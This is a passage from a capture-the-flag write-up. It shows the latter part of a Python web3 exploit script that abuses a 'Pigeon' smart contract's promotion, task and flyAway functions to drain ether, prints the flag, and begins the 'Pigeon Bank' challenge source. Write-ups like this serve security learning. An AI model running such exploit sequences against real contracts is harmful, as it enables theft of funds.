</span></span><span class="line"><span class="cl"><span class="n">code_name</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">solidity_keccak</span><span class="p">([</span><span class="s1">&#39;string&#39;</span><span class="p">,</span> <span class="s1">&#39;string&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s1">&#39;Numbu&#39;</span><span class="p">,</span> <span class="s1">&#39;h5&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">transaction</span> <span class="o">=</span> <span class="n">pigeon_contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">promotion</span><span class="p">(</span><span class="n">code_name</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;Numbu&#39;</span><span class="p">,</span> <span class="s1">&#39;h3&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">signed_transaction</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">transaction</span><span class="p">,</span> <span class="n">private_key</span><span class="o">=</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed_transaction</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;tx hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Transfer 2 ether</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Transfer 2 ether to temp_storage&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">transaction</span> <span class="o">=</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;to&#39;</span><span class="p">:</span> <span class="n">temp_storage_address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;gas&#39;</span><span class="p">:</span> <span class="mi">100000</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">to_wei</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;ether&#39;</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="n">signed_transaction</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">transaction</span><span class="p">,</span> <span class="n">private_key</span><span class="o">=</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed_transaction</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;tx hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;temp_storage_address: </span><span class="si">{</span><span class="n">temp_storage_address</span><span class="si">}</span><span class="s1">, balance: </span><span class="si">{</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">temp_storage_address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Call task twice</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">idx</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Execute task[</span><span class="si">{</span><span class="n">idx</span><span class="si">}</span><span class="s1">]&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">code_name</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">solidity_keccak</span><span class="p">([</span><span class="s1">&#39;string&#39;</span><span class="p">,</span> <span class="s1">&#39;string&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s1">&#39;Numbu&#39;</span><span class="p">,</span> <span class="s1">&#39;h3&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl">    <span class="n">transaction</span> <span class="o">=</span> <span class="n">pigeon_contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">task</span><span class="p">(</span><span class="n">code_name</span><span class="p">,</span> <span class="n">temp_storage_address</span><span class="p">,</span> <span class="n">w3</span><span class="o">.</span><span class="n">to_wei</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="s1">&#39;ether&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span>
</span></span><span class="line"><span class="cl">    <span class="p">})</span>
</span></span><span class="line"><span class="cl">    <span class="n">signed_transaction</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">transaction</span><span class="p">,</span> <span class="n">private_key</span><span class="o">=</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed_transaction</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;tx hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="n">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Call flyaway</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Call flyAway&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">code_name</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">solidity_keccak</span><span class="p">([</span><span class="s1">&#39;string&#39;</span><span class="p">,</span> <span class="s1">&#39;string&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s1">&#39;Numbu&#39;</span><span class="p">,</span> <span class="s1">&#39;h3&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">transaction</span> <span class="o">=</span> <span class="n">pigeon_contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">flyAway</span><span class="p">(</span><span class="n">code_name</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">signed_transaction</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">transaction</span><span class="p">,</span> <span class="n">private_key</span><span class="o">=</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed_transaction</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;tx hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Player address: </span><span class="si">{</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="si">}</span><span class="s1">, balance: </span><span class="si">{</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Call promotion</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Call promotion&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">code_name</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">solidity_keccak</span><span class="p">([</span><span class="s1">&#39;string&#39;</span><span class="p">,</span> <span class="s1">&#39;string&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s1">&#39;Numbu&#39;</span><span class="p">,</span> <span class="s1">&#39;h3&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">transaction</span> <span class="o">=</span> <span class="n">pigeon_contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">promotion</span><span class="p">(</span><span class="n">code_name</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="s1">&#39;Numbu&#39;</span><span class="p">,</span> <span class="s1">&#39;h1&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">signed_transaction</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">transaction</span><span class="p">,</span> <span class="n">private_key</span><span class="o">=</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed_transaction</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;tx hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Call flyaway</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Call flyAway&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">code_name</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">solidity_keccak</span><span class="p">([</span><span class="s1">&#39;string&#39;</span><span class="p">,</span> <span class="s1">&#39;string&#39;</span><span class="p">],</span> <span class="p">[</span><span class="s1">&#39;Numbu&#39;</span><span class="p">,</span> <span class="s1">&#39;h1&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="n">transaction</span> <span class="o">=</span> <span class="n">pigeon_contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">flyAway</span><span class="p">(</span><span class="n">code_name</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">signed_transaction</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">transaction</span><span class="p">,</span> <span class="n">private_key</span><span class="o">=</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed_transaction</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;tx hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Player address: </span><span class="si">{</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="si">}</span><span class="s1">, balance: </span><span class="si">{</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Call getback</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Call getBack&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">transaction</span> <span class="o">=</span> <span class="n">temp_storage_contract</span><span class="o">.</span><span class="n">functions</span><span class="o">.</span><span class="n">getBack</span><span class="p">()</span><span class="o">.</span><span class="n">build_transaction</span><span class="p">({</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;from&#39;</span><span class="p">:</span> <span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;nonce&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_transaction_count</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">),</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;gasPrice&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">gas_price</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;value&#39;</span><span class="p">:</span> <span class="mi">0</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;chainId&#39;</span><span class="p">:</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">chain_id</span>
</span></span><span class="line"><span class="cl"><span class="p">})</span>
</span></span><span class="line"><span class="cl"><span class="n">signed_transaction</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">account</span><span class="o">.</span><span class="n">sign_transaction</span><span class="p">(</span><span class="n">transaction</span><span class="p">,</span> <span class="n">private_key</span><span class="o">=</span><span class="n">private_key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">tx_hash</span> <span class="o">=</span> <span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">send_raw_transaction</span><span class="p">(</span><span class="n">signed_transaction</span><span class="o">.</span><span class="n">rawTransaction</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;tx hash: </span><span class="si">{</span><span class="n">tx_hash</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">sleep</span><span class="p">(</span><span class="mi">15</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Final state&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Player address: </span><span class="si">{</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="si">}</span><span class="s1">, balance: </span><span class="si">{</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">player</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;pigeon_address: </span><span class="si">{</span><span class="n">pigeon_address</span><span class="si">}</span><span class="s1">, balance: </span><span class="si">{</span><span class="n">w3</span><span class="o">.</span><span class="n">eth</span><span class="o">.</span><span class="n">get_balance</span><span class="p">(</span><span class="n">pigeon_address</span><span class="p">)</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">out</span> <span class="o">=</span> <span class="n">get_flag</span><span class="p">(</span><span class="n">uuid</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">info</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">decode</span><span class="p">())</span>
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><strong>Flag: SEE{c00_c00_5py_squ4d_1n_act10n_9fbd82843dced19ebb7ee530b540bf93}</strong></p>
</blockquote>
<h2 id="pigeon-bank">Pigeon Bank</h2>
<div class="details admonition quote open">
        <div class="details-summary admonition-title">
            <i class="icon fas fa-quote-right fa-fw" aria-hidden="true"></i>Description<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
        </div>
        <div class="details-content">
            <div class="admonition-content">The new era is coming. Pigeons are invading and in order to survive, the SEE Team created PigeonBank so that people can get extremely high interest rate. Hold PETH to get high interest. PETH is strictly controlled by the SEE team to prevent manipulation and corruption.</div>
        </div>
    </div>
<h3 id="initial-analysis-2">Initial Analysis</h3>
<p>In this challenge, we were given three solidity files. Let&rsquo;s check it.</p>
<p><strong>PETH.sol</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-solidity" data-lang="solidity"><span class="line"><span class="cl"><span class="c1">// SPDX-License-Identifier: UNLICENSED
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">pragma solidity</span> <span class="o">^</span><span class="mi">0</span><span class="p">.</span><span class="mi">8</span><span class="p">.</span><span class="mi">17</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/access/Ownable.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="s">&#34;@openzeppelin/contracts/utils/Address.sol&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
